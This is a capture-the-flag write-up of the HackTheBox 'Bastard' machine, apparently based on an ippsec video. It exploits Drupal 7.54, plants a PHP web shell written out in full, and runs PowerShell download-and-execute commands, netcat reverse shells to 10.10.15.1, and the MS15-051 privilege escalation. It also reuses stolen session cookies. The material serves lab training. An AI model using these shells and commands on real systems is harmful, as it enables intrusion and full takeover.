---
published: true
---

Disassembly of ippsec’s youtube video HackTheBox - Bastard. Windows box without the use of Metasploit, a few different ways to enumerate the privesc. Managing cookies importing/exporting. Exploit modification/testing. Setting up Burp Suite to capture an exploits traffic and SMB file execution with impacket.


----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*

----------


![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557206480214_image.png)


This series of write-up will contain comprehensive write-ups of hackthebox machines. In an effort to sharpen reporting techniques and help solidify the understand and methodologies used during penetration testing.

# Enumeration
nmap scan:

    nmap -sC -sV -oA nmap 10.10.10.9

(output)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557208485002_image.png)

Port 80 - web-server IIS
Port 135 - Windows RPC
Port 49154 - Windows RPC

Based on the above ports we can guess that this is a Windows Server, not so obvious that this ins a Windows Server 2008 R2 because the IIS version is 7.5

## google IIS versions

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557208662852_image.png)

*version 9 was skipped basically due to a potential lazy programmer*

## web-server

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557208823190_image.png)

*Drupal web-server, we can use a script called* `*droopescan*`
Github Link: https://github.com/droope/droopescan

“droopescan” normally takes quite a bit of time (few thousand requests)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557209129138_image.png)

    ./droopescan scan drupal -u 10.10.10.9

(results after 45min)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557228952069_image.png)

Note: there is another drupal scanner called “drupscan” but the downside is that it has not been updated.

## default drupal files
`/CHANGELOG.txt` is a default file on installations.

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557209312956_image.png)

*we can enumerate the version number as “7.54” published 2017.*

## google drupal exploits

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557209379065_image.png)

*the first post:*

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557209399571_image.png)

 *using an “unserialized()” can receive remote code execution. With in the exploit we can see that it is directly intended for version “7.54”*

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557209846206_image.png)

second, sign of confirmation was the date of the post being March 2017:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557209883982_image.png)

## Searchsploit Drupal
    searchsploit drupal

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557213479953_image.png)

*7.X looks familar and might be the exploit just seen in the blog post.*

View exploit:

    searchpsloit -x php/webapps/41564.php

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557213962287_image.png)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557214024561_image.png)

*This is the blog post exploit*

Various ways to clone a copy of the exploit, personally I like the `-m` which mirrors the exploit to the working directory but IppSec in this situation uses `-p` to copy to clip board, paste into working directory and renames the files to drupal.php:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557214226922_image.png)

## dissembling the exploit

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557214294639_image.png)

*it’s a PHP script which would be considered odd but since this is using a serialization() exploit it makes sense.*

Uses 3 section:

1. Use the SQL INjection to get the contents of the cache for the current endpoint along with the admin credentials and hash
2. After the cache to allow us to write a file and o so
3. Restore the cache

## modify exploit
change the url:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557214522538_image.png)

change filename, which was originally a linux php which might have issues with the windows box:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557214537892_image.png)

## create custom php webshell within exploit
adding a custom webshell as a new variable:

    $phpCode = <<<'EOD'
    <?php
      if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.15.1:8000/" . $_REQUEST['fupload]));
      };
      if (isset($_REQUEST['fexec'])) {
        echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
      };
    ?>
    EOD;
    
    # code corrected to final and in working state

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215072832_image.png)

Check for code errors:

    php drupal.php

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215143411_image.png)

*syntax error line 80*

    vi drupal.php
    :80 # goes to line 80

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215196206_image.png)

*remove the “us.”*

re-run

    php drupal.php

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215240845_image.png)

*code executes correctly.*

## test php code interactive mode
    php -a

*paste the code and call the variable* `*$phpCode*`

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215345160_image.png)

*there is a mistake with the “</pre”;” is not closed off.*

correct line:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215546741_image.png)

# Exploit against Web-Server
    php drupal.php

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215701389_image.png)

*failed to login.*

## pipe to Burp to see process

simplest way to push this php script through burp change the bind port under options:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215797018_image.png)

Request handling tab - redirect all request from 10.10.10.9 to port 80:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215858750_image.png)

tick box for Proxy Listeners:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215904554_image.png)

Navigate to `127.0.0.1:8090`

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557215987167_image.png)

Edit `drupal.php` to reflect the new `127.0.0.1:8090`

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216084316_image.png)

## re-run exploit against webserver

make sure burp intercept is on: 

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216128132_image.png)

change to intercept client (untick: Content type):

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216266288_image.png)

    php drupal.php

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216320626_image.png)

*at this point we can analyze everything the server says back to us.*

## burp/modify exploit code directory

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216357287_image.png)

*right off the bat there is two slashes in the beginning (requires fixing)*

Response:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216413468_image.png)

*404 error Not Found - due to the double slashes*

through multiple guessing “dumb luck” it was discovered that removing the slash and “endpoint” that a 200 Response occurs. If had not found that directory the next step would have been to preform a dirbuster scan or gobuster to find said directory:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216567743_image.png)

(return)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216594153_image.png)

## final modified exploit

changed url to target, changed the endpoint path and ensured that there was no extra slash at the end of the url:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216791015_image.png)

# RCE
    php drupal.php

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557216950955_image.png)

navigating to directory

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557217021246_image.png)

*file exists and now we can pass systems commands directly via the browser URL*

    10.10.10.19/ippsec.php?fexec=dir

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557217097133_image.png)

*we have remote code execution*

## investigating files from exploit
    cat user.json

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557217182417_image.png)

*Could try cracking this password which looks like it the ID of the drupal user.*

    cat sessions.json

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557217309462_image.png)

Import session cookies into firefox > Tools > Cookies Manager+ > Cookies Manager+

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557220736687_image.png)

copy the “session_name”

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557220787133_image.png)

paste in Add new cookie:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557220820990_image.png)

copy “session_id”

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557220851485_image.png)

paste in Add new cookie:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557220885234_image.png)

save/close:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557220939168_image.png)

*at this point if we refresh the page we will be sending the administrator cookie to the web-server*

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557221263595_image.png)

“*Hello admin” in the top right corner.*

## Enumerating Windows
Firstly, view environment,

    10.10.10.9/ippsec.php?fexec=systeminfo

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557222091157_image.png)

*In this scenario the hotfixes are “N/A” meaning this version of windows has never been updated.*

Looking at the OS Version: 6.1.7600 N/A Build 7600 indicates that there is no service pack installed.

What we know now:
Microsoft Windows Server 2008 R2 Datacenter
6.7.7600 N/A Build 7600 (no service packs installed)
“Maybe” no hotfixes installed

Second, look into Kernal privesc (keep in mind these exploits have the potential for BSoD)
Run PowerUp.ps1

    locate PowerUp.ps1
    cp /opt/Empire/data/module_source/privesc/PowerUp.ps1 . #copies to local directory

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557222607178_image.png)

edit PowerUp.ps1 and add `Invoke-AllChecks` at bottom:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557222666992_image.png)

Setup SimpleHTTPServer

    python -m SimpleHTTPServer

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557222742113_image.png)

Windows target download file:

    10.10.10.9/ippsec.
    php?fexec=echo "IEX(New-Object Net.WebClient)DownloadString('http://10.10.15.1:8000/PowerUp.ps1')

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557222939911_image.png)

Pipe to powershell

    10.10.10.9/ippsec.php?fexec=echo "IEX(New-Object Net.WebClient)DownloadString('http://10.10.15.1:8000/PowerUp.ps1') | powershell -noprofile -

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557222984811_image.png)

*the piping is performed to get execution.*
(results after a bit of time)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557223368493_image.png)

*we get an unquoted service denied which can be tested with*

    10.10.10.9/ippsec.php?fexec=sc query state= all

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557223491232_image.png)

*once we privesc we’ll run this command again and see if we can access.*

In this situation as well we can not  “Checking service executable and argument permissions” - Start/Stop a service (second check)

Unable to “Check service permissions…” - if we could overwrite the permissions of a server.

We have the ability to “potientally “takeover” DLL locations…”

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557223813932_image.png)

*which we would have the ability to take over Oracle files, meaning if we could restart oracle we could get code execution.*

Check for if oracle is running

    10.10.10.9/ippsec.php?fexec=netstat -an

*we see MySQL is running on port 3306, don’t see oracle which is normally like 1521 and this point we can skip this avenue.*

Continue analyzing the PowerUp.ps1:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557224122299_image.png)

*The rest of the report doesn’t lead to a way to escalation. Another script that is really liked is “Sherlock.ps1”* 

Copy Sherlock.ps1 to working directory:

Manage Unicode

    dose2unix Sherlock.ps1

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557224312191_image.png)

Edit “Sherlock.ps1” to inlude “Find-AllVulns” at the bottom of the script.

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557224391727_image.png)

upload “Sherlock.ps1” to target

    10.10.10.9/ippsec.php?fexec=echo "IEX(New-Object Net.WebClient)DownloadString('http://10.10.15.1:8000/Sherlock.ps1') | powershell -noprofile -

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557224463976_image.png)

Sherlock.ps1 Results:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557225430727_image.png)

*all basically says is to migrate to a 64bit process.*

## windows nc for reverse-shell

Windows notoriously does not have the best way to setup a reverse shell as to if we download a copy of it to the box we could use it to aid in the reverse shell.

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557223194055_image.png)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557223271301_image.png)

Netcat x86 (32-bit) & x64 Link: https://eternallybored.org/misc/netcat/

Extract and move to working directory and upload to target:

    10.10.10.9/ippsec.php?fupload=nc64.exe&fexec=nc64.exe -e cmd 10.10.15.1 8081

*since the file is being upload we can execute it directly after that.*

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557224859616_image.png)

RUN

# Reverse-Shell
setup listener

    nc -lvnp 8081

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557224835036_image.png)

(response)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557224910381_image.png)

*we have entered flavor country with a new shell in hand.*

## sherlock inside shell
    10.10.10.9/ippsec.php?fexec=echo "IEX(New-Object Net.WebClient)DownloadString('http://10.10.15.1:8000/Sherlock.ps1') | powershell -noprofile -

(results)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557225505986_image.png)

*now works correctly as our netcat file was an x64 application. In this situation it saying that the 15-051 is not vulnerable but that is not actually the case.*

## bit of cheating (ms exploits)

Having prior knowledge that the box is vulnerable to MS15-051

## google MS15-051 proof of concept

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557225209043_image.png)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557225304544_image.png)

download `MS15-051-KB3045171.zip`  and extract to local directory. Now if this was a real pentest you would download the source file inspect for backdoors and then compile locally before using it on the system.


# Root&Loot
upload MS15-051 file to target:

    10.10.10.9/ippsec.php?fupload=ms15-051x64.exe&fexec=ms15-051x64.exe whoami

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557225763459_image.png)

NT AUTHORITY/SYSTEM

## setup NT Authority/System shell

Listener:

    nc -lvnp 8082

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557227674071_image.png)

Sending to another shell:

    10.10.10.9/ippsec.php?fupload=ms15-051x64.exe&fexec=ms15-051x64.exe "nc64.exe -e cmd 10.10.15.1 8082"

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557227727114_image.png)

(return)

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557227756998_image.png)

## extra tips

If for any reason you do not see hotfixes you can go to the following directory and verify:

    cd \Windows\SoftwareDistribution\Download

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557227866100_image.png)

*temporary location of WSUS updates*

Windows update log:

    C:\Windows>type WindowsUpdate.log

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557227956319_image.png)

*will tell you when its installing patches.*

Executing files off UNC shares - OSCP lateral movement (firewalls would generally prevent this )
(Simliar HTTPServer but for Samba)
Kali has a built in `impacket-smbserver` which then you give it a share name and a directory you would want to share out:

    impacket-smbserver ippsec `pwd`

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557228203847_image.png)

rename `ms15-051x64.exe` to `privesc.exe`

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557228273422_image.png)

target connect to smb server

    10.10.10.9/ippsec.php?fexec=\\10.10.15.1\ippsec\privesc.exe whoami

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557228693724_image.png)

impacket see’s the incoming connection:

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557228797119_image.png)

*verifies that the target indeed interacted with the server.*

Browser returns: NT AUTHORITY\SYSTEM

![](https://paper-attachments.dropbox.com/s_A6CD30097A191EC1D1DC522F07E437AFA9C9BBBEFEBB2A6C7047AE848EC02494_1557228855662_image.png)

#HAILippsec


----------

If you don’t know who ippsec is check him out at:

Youtube: https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA 

Twitter: https://twitter.com/ippsec
